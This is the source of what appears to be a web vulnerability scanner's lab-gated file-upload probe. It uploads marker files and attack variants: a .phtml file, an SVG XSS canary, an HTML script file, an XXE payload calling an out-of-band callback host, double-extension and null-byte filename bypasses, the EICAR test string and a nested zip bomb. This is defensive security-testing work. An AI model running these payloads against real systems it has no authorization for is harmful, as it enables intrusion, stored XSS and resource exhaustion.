// Dark Matter rule-based scanner — unrestricted file upload probe.
//
// Finds <input type="file"> forms, uploads a benign marker file, then tries
// dangerous variants. Confirmation tiers:
//   1. Acceptance — the upload returns 2xx AND echoes the filename/marker
//      back (a bare "success" word is not storage proof).
//   2. Retrieval — when the upload response discloses where the file went,
//      the probe GETs that URL and requires the marker to come back.
//
// Coverage rows (each leg is one row's oracle; a leg confirms ONLY on its
// own evidence — a bare acceptance is never enough where the plan demands
// a fetch-back or a callback):
//   #150 [Critical] Unrestricted Upload of Dangerous File Type — .phtml leg
//     (2xx + filename echoed, fetch-back when a URL is disclosed).
//   #146 [High] File Upload Extension / MIME Bypass — same .phtml leg
//     (extension half only; the MIME-spoof variant is NOT implemented).
//   #148 [High] Public Storage of Private Uploads — the fetch-back leg
//     (.phtml path only; the "private" content is our own benign marker).
//   #120 [High] XSS via File Upload (SVG/HTML) — SVG + HTML legs: upload a
//     canary SVG (onload handler) / HTML file (script tag), fetch back,
//     confirm ONLY when the served file carries the marker AND the served
//     content-type is scriptable (image/svg+xml / text/html).
//   #149 [High] Stored XSS / XXE via Uploaded File — the SVG/HTML legs
//     above, plus an XML leg: upload an XML file carrying an external
//     parameter entity at a collaborator canary URL, confirm XXE ONLY on a
//     callback hit (same model as xxe.js — opts.oobCallback / oobWaitFor).
//   #144 [High] Double Extension / Null-Byte Upload Bypass —
//     double-extension leg (dmprobe_<rand>.php.txt) and null-byte leg
//     (dmprobe_<rand>.php%00.txt): confirm ONLY when the served file is
//     treated as executable (served content-type indicates PHP, or the file
//     is retrievable at a .php path, or the server echoes a truncated .php
//     name — i.e. it stripped the suffix).
//   #145 [High] File Overwrite via Upload — upload marker-A as
//     dmprobe_<rand>.txt, fetch it back to record the URL, upload marker-B
//     under the SAME filename, fetch the same URL again, confirm ONLY when
//     marker-B replaced marker-A at that URL.
//   #147 [Medium] Malware Upload Without Scanning — EICAR leg: upload the
//     standard EICAR test string (inert by design), confirm ONLY when the
//     upload is accepted AND the file is served back (no scanning blocked
//     or quarantined it).
//   #151 [Medium] Zip Bomb / Decompression Bomb Upload — zip leg: upload a
//     small nested zip (a few KB) with a known decompressed size (~5 MiB of
//     repeated bytes), confirm ONLY on acceptance (2xx + filename echoed).
//
// SAFETY: this probe WRITES files to the target. It runs ONLY when
// opts.allowWrite is true, which runScan sets solely for lab targets
// (labTargets). Everywhere else it returns [] without a single request.
// Uploaded content is a harmless text marker — never a real shell. The
// EICAR string is the industry-standard inert antivirus test file. The
// nested zip is tiny by construction (a few KB uploaded, ~5 MiB
// decompressed) and lab-only.
//
// One finding per form (class 'file_upload'): the strongest confirmed
// variant sets the title/severity; every confirmed variant is listed in
// evidence.variants so each row's leg stays visible in the output.
// class 'file_upload' → default protocol → signalCorrelated=true.
// Severity: high when an executable extension / scriptable upload / XXE /
// bypass / overwrite is confirmed, medium for EICAR / zip /
// unrestricted-but-inert upload.
import { randomBytes } from 'node:crypto';
import { deflateRawSync } from 'node:zlib';

// The EICAR test file — the industry-standard inert antivirus test string.
// It is NOT malware: every antivirus product recognises it as a test file
// and it performs no action. Exported so tests assert on the same string.
export const EICAR_TEST_STRING =
  'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*';

// Zip-bomb leg bound: the nested zip decompresses to this many bytes.
// Kept small on purpose (lab targets only, a few KB uploaded).
const ZIP_DECOMPRESSED_BYTES = 5 * 1024 * 1024;

const UA = 'DarkMatter-Scanner/1.0 (+authorized-scan)';

async function get(url, opts = {}) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), opts.timeoutMs || 15000);
  try {
    const res = await fetch(url, { signal: ctrl.signal, headers: { 'User-Agent': UA, ...(opts.headers || {}) } });
    return await res.text().catch(() => '');
  } finally {
    clearTimeout(t);
  }
}

// Like get(), but also returns the HTTP status and the served content-type
// (the SVG/HTML/double-extension legs judge scriptability / PHP handling
// from it). Tolerates test doubles without headers/status.
async function getFull(url, opts = {}) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), opts.timeoutMs || 15000);
  try {
    const res = await fetch(url, { signal: ctrl.signal, headers: { 'User-Agent': UA, ...(opts.headers || {}) } });
    const text = await res.text().catch(() => '');
    let contentType = null;
    try { contentType = res.headers && typeof res.headers.get === 'function' ? res.headers.get('content-type') : null; } catch { contentType = null; }
    return { status: typeof res.status === 'number' ? res.status : 200, text, contentType };
  } finally {
    clearTimeout(t);
  }
}

function findUploadForms(body, base) {
  const forms = [];
  const re = /<form[^>]*>([\s\S]*?)<\/form>/gi;
  let m;
  while ((m = re.exec(String(body || '')))) {
    const tag = m[0].slice(0, 500);
    if (!/type=["']?file/i.test(m[0])) continue;
    const action = (/action=["']([^"']*)["']/i.exec(tag) || [])[1] || base;
    const fileInput = (/name=["']([^"']+)["'][^>]*type=["']?file/i.exec(m[0]) ||
      /type=["']?file[^>]*name=["']([^"']+)["']/i.exec(m[0]) || [])[1] || 'file';
    try {
      forms.push({ action: new URL(action, base).toString(), fileInput });
    } catch {
      // ignore
    }
  }
  return forms.slice(0, 2);
}

async function upload(action, fileInput, filename, content, opts = {}) {
  const fd = new FormData();
  // The part's content-type matters: servers that validate the declared
  // MIME see image/svg+xml / text/html / application/xml / application/zip
  // for the dangerous variants, text/plain for the benign ones.
  fd.append(fileInput, new Blob([content], { type: opts.contentType || 'text/plain' }), filename);
  fd.append('Submit', 'Upload');
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), opts.timeoutMs || 20000);
  try {
    const res = await fetch(action, {
      method: 'POST',
      signal: ctrl.signal,
      headers: { 'User-Agent': UA, ...(opts.headers || {}) },
      body: fd,
    });
    // Status is load-bearing: a 4xx/5xx error page carrying the word
    // "success" must not pass the stored gate.
    return { status: res.status, text: await res.text().catch(() => '') };
  } finally {
    clearTimeout(t);
  }
}

function escapeRegExp(s) {
  return s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

function windowAround(text, needle, before = 60, after = 80) {
  const idx = text.indexOf(needle);
  if (idx < 0) return text.slice(0, 120);
  return text.slice(Math.max(0, idx - before), idx + needle.length + after);
}

// Find a retrievable URL for the uploaded file in the upload response
// (href/src/action attribute or bare path containing the filename),
// resolved against the form action. Null when the response discloses none.
function findUploadedUrl(respText, filename, base) {
  const esc = escapeRegExp(filename);
  const attr = new RegExp(`(?:href|src|action)\\s*=\\s*["']([^"']*${esc}[^"']*)["']`, 'i').exec(respText);
  if (attr) {
    try { return new URL(attr[1], base).toString(); } catch { return null; }
  }
  const bare = new RegExp(`["'\\s]\\s*(/[^"'\\s]*${esc}[^"'\\s]*)`, 'i').exec(respText);
  if (bare) {
    try { return new URL(bare[1], base).toString(); } catch { return null; }
  }
  return null;
}

// --- Minimal ZIP builder (zip-bomb leg) ---------------------------------
// A nested zip: the outer zip holds inner.zip (deflated), which holds a
// ~5 MiB file of repeated bytes (deflated). A few KB on the wire,
// ~5 MiB at full expansion. Written by hand (local headers + central
// directory + EOCD) so the probe needs no dependency.
const CRC_TABLE = (() => {
  const t = new Uint32Array(256);
  for (let n = 0; n < 256; n++) {
    let c = n;
    for (let k = 0; k < 8; k++) c = (c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1);
    t[n] = c >>> 0;
  }
  return t;
})();

function crc32(buf) {
  let c = 0xFFFFFFFF;
  for (let i = 0; i < buf.length; i++) c = CRC_TABLE[(c ^ buf[i]) & 0xFF] ^ (c >>> 8);
  return (c ^ 0xFFFFFFFF) >>> 0;
}

function buildZip(entries) {
  const locals = [];
  const centrals = [];
  let offset = 0;
  for (const { name, data, deflate } of entries) {
    const nameBuf = Buffer.from(name, 'utf8');
    const raw = Buffer.isBuffer(data) ? data : Buffer.from(data);
    const compressed = deflate ? deflateRawSync(raw) : raw;
    const method = deflate ? 8 : 0;
    const crc = crc32(raw);
    const local = Buffer.alloc(30 + nameBuf.length);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(0, 6);
    local.writeUInt16LE(method, 8);
    local.writeUInt16LE(0, 10);
    local.writeUInt16LE(0, 12);
    local.writeUInt32LE(crc, 14);
    local.writeUInt32LE(compressed.length, 18);
    local.writeUInt32LE(raw.length, 22);
    local.writeUInt16LE(nameBuf.length, 26);
    local.writeUInt16LE(0, 28);
    nameBuf.copy(local, 30);
    const central = Buffer.alloc(46 + nameBuf.length);
    central.writeUInt32LE(0x02014b50, 0);
    central.writeUInt16LE(20, 4);
    central.writeUInt16LE(20, 6);
    central.writeUInt16LE(0, 8);
    central.writeUInt16LE(method, 10);
    central.writeUInt16LE(0, 12);
    central.writeUInt16LE(0, 14);
    central.writeUInt32LE(crc, 16);
    central.writeUInt32LE(compressed.length, 20);
    central.writeUInt32LE(raw.length, 24);
    central.writeUInt16LE(nameBuf.length, 28);
    central.writeUInt16LE(0, 30);
    central.writeUInt16LE(0, 32);
    central.writeUInt16LE(0, 34);
    central.writeUInt16LE(0, 36);
    central.writeUInt32LE(0, 38);
    central.writeUInt32LE(offset, 42);
    nameBuf.copy(central, 46);
    locals.push(local, compressed);
    centrals.push(central);
    offset += local.length + compressed.length;
  }
  const cdOffset = offset;
  const cd = Buffer.concat(centrals);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(0, 4);
  eocd.writeUInt16LE(0, 6);
  eocd.writeUInt16LE(entries.length, 8);
  eocd.writeUInt16LE(entries.length, 10);
  eocd.writeUInt32LE(cd.length, 12);
  eocd.writeUInt32LE(cdOffset, 16);
  eocd.writeUInt16LE(0, 20);
  return Buffer.concat([...locals, cd, eocd]);
}

function buildNestedZip(marker) {
  // Inner payload: the marker up front (identifies the probe's file if the
  // server ever extracts it), then repeated bytes to the 5 MiB bound.
  const innerPayload = Buffer.concat([
    Buffer.from(`${marker}\n`, 'utf8'),
    Buffer.alloc(ZIP_DECOMPRESSED_BYTES - marker.length - 1, 0x41),
  ]);
  const innerZip = buildZip([{ name: 'payload.bin', data: innerPayload, deflate: true }]);
  const outerZip = buildZip([{ name: 'inner.zip', data: innerZip, deflate: true }]);
  return { buffer: outerZip, uploadedBytes: outerZip.length, decompressedBytes: ZIP_DECOMPRESSED_BYTES };
}

function isPhpContentType(ct) {
  return /php|x-httpd-php/i.test(String(ct || ''));
}

export async function probeFileUpload(url, opts = {}) {
  // LAB GATE: never touch the network unless explicitly allowed.
  if (!opts || opts.allowWrite !== true) return [];
  const findings = [];
  let body = '';
  try {
    body = await get(url, opts);
  } catch {
    return findings;
  }
  const forms = findUploadForms(body, url);
  for (const form of forms) {
    const rand = randomBytes(4).toString('hex');
    const marker = `dm-upload-marker-${rand}`;
    const txtName = `dmprobe_${rand}.txt`;
    let resp;
    try {
      resp = await upload(form.action, form.fileInput, txtName, marker, opts);
    } catch {
      continue;
    }
    // Stored gate: 2xx AND the filename/marker echoed back. A bare
    // success word ("profile updated successfully") is not storage proof.
    const stored = resp.status >= 200 && resp.status < 300 &&
      (resp.text.includes(txtName) || resp.text.includes(marker));
    if (!stored) continue;

    // One confirmed variant per leg; the strongest sets the finding's
    // title/severity, all confirmed ids are listed in evidence.variants.
    const variants = [];
    const accepted = (r, name, content) =>
      r.status >= 200 && r.status < 300 && (r.text.includes(name) || (content && r.text.includes(content)));

    // Dangerous variant: executable-ish extension (#150 / #146).
    const evilName = `dmprobe_${rand}.phtml`;
    let evilResp = { status: 0, text: '' };
    try {
      evilResp = await upload(form.action, form.fileInput, evilName, marker, opts);
    } catch {
      // ignore — a failed evil upload means the extension was not accepted
    }
    const evilAccepted = evilResp.status >= 200 && evilResp.status < 300 &&
      evilResp.text.includes(evilName);
    // Fetch-back: prove the file is actually served when the upload
    // response discloses where it went.
    let servedBack = null;
    if (evilAccepted) {
      const upUrl = findUploadedUrl(evilResp.text, evilName, form.action);
      if (upUrl) {
        try {
          const served = await get(upUrl, opts);
          if (served.includes(marker)) servedBack = { url: upUrl, window: windowAround(served, marker) };
        } catch { /* not retrievable at the disclosed URL */ }
      }
    }
    if (evilAccepted) {
      variants.push({
        id: 'phtml',
        title: 'Unrestricted file upload accepts executable extension (.phtml)',
        severity: 'high',
        filename: evilName,
        response: servedBack
          ? `server accepted ${evilName} and serves it back at ${servedBack.url} — "...${servedBack.window}..."`
          : `server accepted ${evilName} (HTTP ${evilResp.status}, filename echoed in upload response) — "...${windowAround(evilResp.text, evilName)}..."`,
        impact: 'executable upload primitive — webshell path on misconfigured hosts',
      });
    }

    // #120 — SVG leg: canary SVG with an onload handler; confirm ONLY when
    // the served file carries the marker AND is served as image/svg+xml
    // (a text/plain SVG is not scriptable in the victim's browser).
    try {
      const svgName = `dmprobe_${rand}.svg`;
      const svgContent = `<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://example.invalid/dm-${rand}')"><text>${marker}</text></svg>`;
      const svgResp = await upload(form.action, form.fileInput, svgName, svgContent, { ...opts, contentType: 'image/svg+xml' });
      if (accepted(svgResp, svgName, marker)) {
        const svgUrl = findUploadedUrl(svgResp.text, svgName, form.action);
        if (svgUrl) {
          const served = await getFull(svgUrl, opts);
          if (served.status >= 200 && served.status < 300 && served.text.includes(marker) &&
              /image\/svg\+xml/i.test(String(served.contentType || ''))) {
            variants.push({
              id: 'svg',
              title: 'Stored XSS via uploaded SVG file (served as image/svg+xml)',
              severity: 'high',
              filename: svgName,
              response: `server accepted ${svgName} and serves it back as image/svg+xml at ${svgUrl} — "...${windowAround(served.text, marker)}..."`,
              impact: 'stored XSS — the SVG executes script when loaded in a victim browser',
            });
          }
        }
      }
    } catch { /* leg is best-effort; a transport failure is not a finding */ }

    // #120 — HTML leg: same oracle, served as text/html.
    try {
      const htmlName = `dmprobe_${rand}.html`;
      const htmlContent = `<html><head><title>${marker}</title></head><body><script>/* ${marker} */</script><p>${marker}</p></body></html>`;
      const htmlResp = await upload(form.action, form.fileInput, htmlName, htmlContent, { ...opts, contentType: 'text/html' });
      if (accepted(htmlResp, htmlName, marker)) {
        const htmlUrl = findUploadedUrl(htmlResp.text, htmlName, form.action);
        if (htmlUrl) {
          const served = await getFull(htmlUrl, opts);
          if (served.status >= 200 && served.status < 300 && served.text.includes(marker) &&
              /text\/html/i.test(String(served.contentType || ''))) {
            variants.push({
              id: 'html',
              title: 'Stored XSS via uploaded HTML file (served as text/html)',
              severity: 'high',
              filename: htmlName,
              response: `server accepted ${htmlName} and serves it back as text/html at ${htmlUrl} — "...${windowAround(served.text, marker)}..."`,
              impact: 'stored XSS — the HTML file executes script when opened in a victim browser',
            });
          }
        }
      }
    } catch { /* leg is best-effort */ }

    // #149 — XML leg (XXE via uploaded file): upload an XML file carrying
    // an external parameter entity at a collaborator canary URL; confirm
    // ONLY on a callback hit (same model as xxe.js). No oobCallback means
    // the leg cannot run — it stays silent, never a bare-acceptance claim.
    // No waiter means the hit cannot be observed in-scan — also silent.
    if (opts.oobCallback && typeof opts.oobWaitFor === 'function') {
      try {
        const token = `upload-xxe-oob-${rand}`;
        const oobUrl = `${String(opts.oobCallback).replace(/\/+$/, '')}/${token}`;
        const xmlName = `dmprobe_${rand}.xml`;
        const xmlContent = `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % dmxxe SYSTEM "${oobUrl}"> %dmxxe;]><r>${marker}</r>`;
        const xmlResp = await upload(form.action, form.fileInput, xmlName, xmlContent, { ...opts, contentType: 'application/xml' });
        if (xmlResp.status !== 0 && accepted(xmlResp, xmlName, marker)) {
          const hit = await opts.oobWaitFor(token, opts.oobWaitTimeoutMs || 8000);
          if (hit) {
            variants.push({
              id: 'xml-xxe',
              title: 'Stored XXE via uploaded XML file (external entity resolved via OOB callback)',
              severity: 'high',
              filename: xmlName,
              response: `server accepted ${xmlName}; external parameter entity → ${oobUrl} sent (HTTP ${xmlResp.status}); collaborator received ${hit.method} ${hit.path} at ${hit.at} — the parser resolved the external entity`,
              impact: 'blind XXE via upload: the XML parser fetches attacker-controlled URLs — gateway to SSRF / file disclosure',
            });
          }
        }
      } catch { /* leg is best-effort */ }
    }

    // #144 — double-extension leg: dmprobe_<rand>.php.txt. Confirm ONLY
    // when the served file is treated as executable: the fetch-back
    // content-type indicates PHP, or the file is retrievable at a .php path.
    try {
      const deName = `dmprobe_${rand}.php.txt`;
      const deResp = await upload(form.action, form.fileInput, deName, marker, opts);
      if (accepted(deResp, deName, marker)) {
        const deUrl = findUploadedUrl(deResp.text, deName, form.action);
        if (deUrl) {
          const served = await getFull(deUrl, opts);
          let confirmed = served.status >= 200 && served.status < 300 &&
            served.text.includes(marker) && isPhpContentType(served.contentType);
          let via = served.contentType;
          if (!confirmed) {
            // .php-path probe: strip the trailing .txt — a server that
            // stored the file under the .php name serves the marker there.
            const phpUrl = deUrl.replace(/\.txt$/i, '');
            if (phpUrl !== deUrl) {
              try {
                const phpServed = await getFull(phpUrl, opts);
                if (phpServed.status >= 200 && phpServed.status < 300 && phpServed.text.includes(marker)) {
                  confirmed = true;
                  via = `retrievable at .php path ${phpUrl}`;
                }
              } catch { /* not retrievable as .php */ }
            }
          }
          if (confirmed) {
            variants.push({
              id: 'double-ext',
              title: 'Upload bypass via double extension (.php.txt served as PHP)',
              severity: 'high',
              filename: deName,
              response: `server accepted ${deName} and treats it as executable (${via}) at ${deUrl} — "...${windowAround(served.text, marker)}..."`,
              impact: 'extension-validation bypass — the file is stored/served as executable PHP despite the .txt suffix',
            });
          }
        }
      }
    } catch { /* leg is best-effort */ }

    // #144 — null-byte leg: dmprobe_<rand>.php%00.txt. Confirm ONLY when
    // the server truncates at the null byte: the upload response echoes a
    // truncated .php name (the full %00 name with the suffix stripped), or
    // the file is retrievable at a .php path.
    try {
      const nbName = `dmprobe_${rand}.php%00.txt`;
      const phpName = `dmprobe_${rand}.php`;
      const nbResp = await upload(form.action, form.fileInput, nbName, marker, opts);
      // A truncating server echoes the TRUNCATED .php name instead of the
      // full %00 name (and never the marker) — that echo IS the acceptance.
      if (nbResp.status >= 200 && nbResp.status < 300 &&
          (nbResp.text.includes(nbName) || nbResp.text.includes(marker) || nbResp.text.includes(phpName))) {
        // Truncation evidence: the .php name appears in the response OUTSIDE
        // any occurrence of the full %00 name (the full name contains the
        // .php name as a substring, so strip it first).
        const stripped = nbResp.text.split(nbName).join('');
        let confirmed = false;
        let via = '';
        let nbUrl = null;
        if (stripped.includes(phpName)) {
          nbUrl = findUploadedUrl(stripped, phpName, form.action);
          if (nbUrl) {
            try {
              const served = await getFull(nbUrl, opts);
              if (served.status >= 200 && served.status < 300 && served.text.includes(marker)) {
                confirmed = true;
                via = `truncated name echoed and served at ${nbUrl}`;
              }
            } catch { /* not retrievable at the truncated URL */ }
          }
        }
        if (!confirmed) {
          // .php-path probe on the disclosed full-name URL.
          const disclosed = findUploadedUrl(nbResp.text, nbName, form.action);
          if (disclosed) {
            const phpUrl = disclosed.replace(/%00\.txt$/i, '.php');
            if (phpUrl !== disclosed) {
              try {
                const phpServed = await getFull(phpUrl, opts);
                if (phpServed.status >= 200 && phpServed.status < 300 && phpServed.text.includes(marker)) {
                  confirmed = true;
                  via = `retrievable at .php path ${phpUrl}`;
                }
              } catch { /* not retrievable as .php */ }
            }
          }
        }
        if (confirmed) {
          variants.push({
            id: 'null-byte',
            title: 'Upload bypass via null byte (.php%00.txt truncated to .php)',
            severity: 'high',
            filename: nbName,
            response: `server accepted ${nbName} and treats it as executable (${via}) — "...${windowAround(nbResp.text, phpName)}..."`,
            impact: 'extension-validation bypass — the null byte truncates the filename to an executable .php file',
          });
        }
      }
    } catch { /* leg is best-effort */ }

    // #145 — overwrite leg: the .txt upload above already stored marker-A
    // under txtName. Fetch it back to record the URL, upload marker-B under
    // the SAME filename, fetch the same URL again; confirm ONLY when
    // marker-B replaced marker-A at that URL.
    try {
      const owUrl = findUploadedUrl(resp.text, txtName, form.action);
      if (owUrl) {
        const first = await getFull(owUrl, opts);
        if (first.status >= 200 && first.status < 300 && first.text.includes(marker)) {
          // marker-B uses a FRESH random suffix: it must not contain
          // marker-A as a substring, or the "marker-A is gone" check below
          // could never pass (marker-A + '-b' contains marker-A).
          const markerB = `dm-upload-marker-${randomBytes(4).toString('hex')}-b`;
          const owResp = await upload(form.action, form.fileInput, txtName, markerB, opts);
          if (accepted(owResp, txtName, markerB)) {
            const second = await getFull(owUrl, opts);
            if (second.status >= 200 && second.status < 300 &&
                second.text.includes(markerB) && !second.text.includes(marker)) {
              variants.push({
                id: 'overwrite',
                title: 'File overwrite via upload (same filename replaced)',
                severity: 'high',
                filename: txtName,
                response: `uploaded ${txtName} with marker-A, fetched it back at ${owUrl}, uploaded marker-B under the same name — the second fetch returns marker-B only, marker-A is gone`,
                impact: 'an attacker can replace existing uploaded files (defacement, config overwrite, stored-payload swap)',
              });
            }
          }
        }
      }
    } catch { /* leg is best-effort */ }

    // #147 — EICAR leg: upload the standard EICAR test string; confirm
    // ONLY when the upload is accepted AND the file is served back (a
    // working scanner would block or quarantine it).
    try {
      const eicarName = `dmprobe_${rand}-eicar.txt`;
      const eicarResp = await upload(form.action, form.fileInput, eicarName, EICAR_TEST_STRING, opts);
      if (eicarResp.status >= 200 && eicarResp.status < 300 &&
          (eicarResp.text.includes(eicarName) || eicarResp.text.includes(EICAR_TEST_STRING))) {
        const eicarUrl = findUploadedUrl(eicarResp.text, eicarName, form.action);
        if (eicarUrl) {
          const served = await getFull(eicarUrl, opts);
          if (served.status >= 200 && served.status < 300 && served.text.includes(EICAR_TEST_STRING)) {
            variants.push({
              id: 'eicar',
              title: 'Malware upload accepted without scanning (EICAR test file served back)',
              severity: 'medium',
              filename: eicarName,
              response: `server accepted ${eicarName} (EICAR test string) and serves it back at ${eicarUrl} — no antivirus scanning blocked or quarantined it`,
              impact: 'uploads are not scanned — a real malicious file would be stored and served the same way',
            });
          }
        }
      }
    } catch { /* leg is best-effort */ }

    // #151 — zip leg: upload a small nested zip (a few KB) with a known
    // decompressed size (~5 MiB); confirm ONLY on acceptance (2xx +
    // filename echoed). The ratio is quoted in the evidence.
    try {
      const zipName = `dmprobe_${rand}.zip`;
      const { buffer, uploadedBytes, decompressedBytes } = buildNestedZip(marker);
      const ratio = Math.round(decompressedBytes / Math.max(1, uploadedBytes));
      const zipResp = await upload(form.action, form.fileInput, zipName, buffer, { ...opts, contentType: 'application/zip' });
      if (accepted(zipResp, zipName, null)) {
        variants.push({
          id: 'zip',
          title: 'Zip bomb upload accepted (decompression bomb primitive)',
          severity: 'medium',
          filename: zipName,
          response: `server accepted ${zipName} (HTTP ${zipResp.status}, filename echoed) — ${uploadedBytes} B uploaded, ~${(decompressedBytes / 1048576).toFixed(1)} MiB decompressed at full expansion (ratio ~${ratio}:1)`,
          impact: 'decompression-bomb primitive — a larger archive could exhaust disk / memory on extraction',
        });
      }
    } catch { /* leg is best-effort */ }

    // Fold: one finding per form. Strongest confirmed variant sets the
    // title/severity; all confirmed ids are listed in evidence.variants.
    const PRIORITY = ['xml-xxe', 'svg', 'html', 'phtml', 'double-ext', 'null-byte', 'overwrite', 'eicar', 'zip'];
    const strongest = PRIORITY.map((id) => variants.find((v) => v.id === id)).find(Boolean) || null;
    const echoNeedle = strongest ? strongest.filename : (resp.text.includes(txtName) ? txtName : marker);
    const echoText = strongest && strongest.id === 'phtml' ? evilResp.text : resp.text;
    const echoWindow = windowAround(echoText, echoNeedle);
    findings.push({
      class: 'file_upload',
      id: `file-upload-${form.action}`.slice(0, 120),
      title: strongest
        ? strongest.title
        : 'Unrestricted file upload (no extension validation observed)',
      severity: strongest ? strongest.severity : 'medium',
      url: form.action,
      evidence: {
        request: `POST ${form.action} multipart (${form.fileInput}=${strongest ? strongest.filename : txtName})`,
        response: strongest
          ? strongest.response
          : `server stored ${txtName} (HTTP ${resp.status}, filename/marker echoed) — "...${echoWindow}..."`,
        impact_demo: strongest
          ? strongest.impact
          : 'arbitrary file write primitive — stored-XSS/phishing payload hosting',
        signalCorrelated: true,
        variants: variants.map((v) => v.id),
      },
    });
  }
  return findings;
}
